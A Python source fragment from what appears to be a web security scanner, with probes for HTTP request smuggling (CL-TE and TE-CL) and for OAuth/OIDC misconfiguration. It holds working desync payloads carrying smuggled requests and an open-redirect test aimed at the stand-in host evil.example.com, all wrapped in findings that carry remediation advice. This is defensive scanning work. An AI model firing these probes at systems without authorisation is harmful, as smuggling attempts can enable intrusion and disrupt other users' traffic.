_SMUGGLE_TIMEOUT_S = 10.0
_SMUGGLE_DELTA_S = 3.0


async def run_http_smuggling_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for CL-TE and TE-CL HTTP request smuggling."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    _progress("active_baseline_start", {
        "probe": "http_smuggling", "hosts": len(targets),
    })

    import httpx as _httpx  # noqa: E401 — need raw transport

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break
        base_url = f"https://{host}/"

        # ── Control: normal POST to measure baseline latency ──
        control_start = time.perf_counter()
        try:
            await http_client.post(
                base_url, content="x=1", timeout=_SMUGGLE_TIMEOUT_S,
                headers={**_PROBE_HEADERS, "Content-Type": "application/x-www-form-urlencoded"},
            )
        except Exception:
            continue
        control_elapsed = time.perf_counter() - control_start

        # ── CL-TE probe ──
        # Front-end uses Content-Length, back-end uses Transfer-Encoding.
        # We send a body that CL says is short but TE says has a chunked
        # trailer containing a partial request → back-end hangs waiting.
        cl_te_body = "0\r\n\r\nGET /cl-te-probe HTTP/1.1\r\nHost: {host}\r\n\r\n"
        cl_te_headers = {
            **_PROBE_HEADERS,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(cl_te_body)),
            "Transfer-Encoding": "chunked",
        }
        probe_start = time.perf_counter()
        try:
            await http_client.post(
                base_url, content=cl_te_body, timeout=_SMUGGLE_TIMEOUT_S,
                headers=cl_te_headers,
            )
        except Exception:
            pass
        cl_te_elapsed = time.perf_counter() - probe_start

        if (cl_te_elapsed - control_elapsed) >= _SMUGGLE_DELTA_S:
            f = {
                "title": "HTTP Request Smuggling (CL-TE Desync)",
                "severity": "Critical",
                "confidence": "Medium",
                "owasp_category": "A05:2021",
                "cwe": "CWE-444",
                "url": base_url,
                "parameter": "Content-Length / Transfer-Encoding",
                "payload": "CL-TE: chunked body with trailing partial request",
                "evidence": (
                    f"Control POST: {control_elapsed:.2f}s, CL-TE probe: "
                    f"{cl_te_elapsed:.2f}s (delta {cl_te_elapsed - control_elapsed:.2f}s). "
                    f"The back-end appears to interpret Transfer-Encoding: chunked "
                    f"while the front-end uses Content-Length, causing a desync."
                ),
                "remediation": (
                    "Configure the front-end proxy to normalize Transfer-Encoding "
                    "headers and reject ambiguous requests. Ensure both layers "
                    "agree on message boundaries."
                ),
                "phase": "Active Baseline (HTTP Smuggling)",
                "tool": "active_baseline.http_smuggling_probe",
                "_finding_source": "active_baseline",
                "_variant": "CL-TE",
            }
            findings.append(f)
            _emit(f)

        # ── TE-CL probe ──
        # Front-end uses Transfer-Encoding, back-end uses Content-Length.
        te_cl_body = "5e\r\nPOST /te-cl-probe HTTP/1.1\r\nHost: {host}\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
        te_cl_headers = {
            **_PROBE_HEADERS,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "4",
            "Transfer-Encoding": "chunked",
        }
        probe_start = time.perf_counter()
        try:
            await http_client.post(
                base_url, content=te_cl_body, timeout=_SMUGGLE_TIMEOUT_S,
                headers=te_cl_headers,
            )
        except Exception:
            pass
        te_cl_elapsed = time.perf_counter() - probe_start

        if (te_cl_elapsed - control_elapsed) >= _SMUGGLE_DELTA_S:
            f = {
                "title": "HTTP Request Smuggling (TE-CL Desync)",
                "severity": "Critical",
                "confidence": "Medium",
                "owasp_category": "A05:2021",
                "cwe": "CWE-444",
                "url": base_url,
                "parameter": "Transfer-Encoding / Content-Length",
                "payload": "TE-CL: mismatched Content-Length with chunked encoding",
                "evidence": (
                    f"Control POST: {control_elapsed:.2f}s, TE-CL probe: "
                    f"{te_cl_elapsed:.2f}s (delta {te_cl_elapsed - control_elapsed:.2f}s). "
                    f"The back-end appears to use Content-Length while the front-end "
                    f"uses Transfer-Encoding: chunked."
                ),
                "remediation": (
                    "Reject requests that contain both Content-Length and "
                    "Transfer-Encoding headers. Configure the front-end "
                    "to strip or normalize Transfer-Encoding before forwarding."
                ),
                "phase": "Active Baseline (HTTP Smuggling)",
                "tool": "active_baseline.http_smuggling_probe",
                "_finding_source": "active_baseline",
                "_variant": "TE-CL",
            }
            findings.append(f)
            _emit(f)

    _progress("active_baseline_end", {
        "probe": "http_smuggling", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 10 — OAuth/OIDC Flow Security Probes
# ═══════════════════════════════════════════════════════════════════════
#
# Checks for common OAuth 2.0 / OpenID Connect misconfigurations:
#   1. Open redirect in authorization endpoint (redirect_uri not validated)
#   2. PKCE not enforced (code_challenge not required)
#   3. Token endpoint accepts credentials in query string
#   4. OIDC discovery endpoint exposes sensitive metadata

_OIDC_DISCOVERY_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
]

_OAUTH_AUTHORIZE_PATHS = [
    "/oauth/authorize", "/authorize", "/oauth2/authorize",
    "/connect/authorize", "/auth/realms/master/protocol/openid-connect/auth",
]


async def run_oauth_oidc_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for OAuth/OIDC misconfigurations."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    _progress("active_baseline_start", {
        "probe": "oauth_oidc", "hosts": len(targets),
    })

    import json as _json  # noqa: E401

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break
        base_url = f"https://{host}"

        # ── OIDC Discovery ──
        for disc_path in _OIDC_DISCOVERY_PATHS:
            try:
                resp = await http_client.get(
                    f"{base_url}{disc_path}", timeout=10.0,
                    follow_redirects=True, headers=_PROBE_HEADERS,
                )
                if resp.status_code != 200:
                    continue
                body = resp.text[:50_000]
                try:
                    config = _json.loads(body)
                except Exception:
                    continue

                if not isinstance(config, dict) or "issuer" not in config:
                    continue

                issues = []
                auth_endpoint = config.get("authorization_endpoint", "")
                token_endpoint = config.get("token_endpoint", "")

                # Check PKCE support
                pkce_methods = config.get("code_challenge_methods_supported", [])
                if not pkce_methods or "S256" not in pkce_methods:
                    issues.append("PKCE (S256) not listed in code_challenge_methods_supported")

                # Check grant types for implicit flow (insecure)
                grant_types = config.get("grant_types_supported", [])
                if "implicit" in grant_types:
                    issues.append("Implicit grant flow is supported (insecure, tokens in URL fragment)")

                # Check if token endpoint uses TLS
                if token_endpoint and not token_endpoint.startswith("https://"):
                    issues.append(f"Token endpoint uses non-HTTPS: {token_endpoint}")

                if issues:
                    f = {
                        "title": f"OAuth/OIDC Configuration Issues ({disc_path})",
                        "severity": "Medium",
                        "confidence": "High",
                        "owasp_category": "A07:2021",
                        "cwe": "CWE-346",
                        "url": f"{base_url}{disc_path}",
                        "parameter": disc_path,
                        "payload": f"GET {disc_path}",
                        "evidence": (
                            f"OIDC discovery at {disc_path}: " + "; ".join(issues) +
                            f". Issuer: {config.get('issuer', 'n/a')}."
                        ),
                        "remediation": (
                            "Enforce PKCE with S256 for all authorization code flows. "
                            "Disable the implicit grant type. Use HTTPS for all "
                            "OAuth endpoints. Restrict OIDC discovery to necessary fields."
                        ),
                        "phase": "Active Baseline (OAuth/OIDC)",
                        "tool": "active_baseline.oauth_oidc_probe",
                        "_finding_source": "active_baseline",
                    }
                    findings.append(f)
                    _emit(f)

                # ── Test redirect_uri validation ──
                if auth_endpoint:
                    evil_redirect = "https://evil.example.com/callback"
                    test_url = (
                        f"{auth_endpoint}?response_type=code"
                        f"&client_id=probe_test"
                        f"&redirect_uri={evil_redirect}"
                        f"&scope=openid"
                    )
                    try:
                        auth_resp = await http_client.get(
                            test_url, timeout=10.0, follow_redirects=False,
                            headers=_PROBE_HEADERS,
                        )
                        location = str(auth_resp.headers.get("location", ""))
                        if "evil.example.com" in location:
                            f = {
                                "title": "OAuth Open Redirect via redirect_uri",
                                "severity": "High",
                                "confidence": "High",
                                "owasp_category": "A07:2021",
                                "cwe": "CWE-601",
                                "url": test_url,
                                "parameter": "redirect_uri",
                                "payload": evil_redirect,
                                "evidence": (
                                    f"Authorization endpoint redirects to attacker-controlled "
                                    f"URL: {location}. The redirect_uri parameter is not "
                                    f"validated against a whitelist."
                                ),
                                "remediation": (
                                    "Validate redirect_uri against a strict whitelist of "
                                    "pre-registered callback URLs. Reject any redirect_uri "
                                    "not exactly matching a registered value."
                                ),
                                "phase": "Active Baseline (OAuth/OIDC)",
                                "tool": "active_baseline.oauth_oidc_probe",
                                "_finding_source": "active_baseline",
                            }
                            findings.append(f)
                            _emit(f)
                    except Exception:
                        pass

                break  # found a valid discovery endpoint
            except Exception:
                continue

    _progress("active_baseline_end", {
        "probe": "oauth_oidc", "findings": len(findings),
    })
    return findings


__all__ = [
    "run_bare_root_sqli_probe",
    "run_cache_poisoning_probe",
    "run_reflected_xss_probe",
    "run_ssrf_probe",
    "run_open_redirect_probe",
    "run_sensitive_path_probe",
    "run_salesforce_probe",
    "run_graphql_introspection_probe",
    "run_http_smuggling_probe",
    "run_oauth_oidc_probe",
    "_discover_params_from_html",
    "_discover_ssrf_params",
    "_classify_canary_context",
    "_is_salesforce_host",
]
